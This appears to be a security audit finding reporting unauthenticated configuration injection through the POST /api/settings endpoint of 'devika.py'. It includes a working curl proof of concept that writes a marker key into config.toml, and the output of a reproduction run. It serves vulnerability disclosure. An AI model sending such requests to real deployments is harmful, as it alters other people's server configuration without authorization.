# F-H-SETTINGS-1: Unauthenticated configuration injection

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2; output from real run)

## Description
`POST /api/settings` in `devika.py:201-204` writes arbitrary key/value pairs under existing `config.toml` sections with no authorization or key whitelist.

## Impact
Unauthenticated remote client injects persistent server configuration.

## PoC
```bash
curl -X POST "http://<host>:1337/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"STORAGE": {"REPRO_INJECTED_KEY": "pwned-marker"}}'
```

## Execution result
```
[SETTINGS-1] {"verdict": "REPRODUCED", "persisted_in_config_toml": true}
```
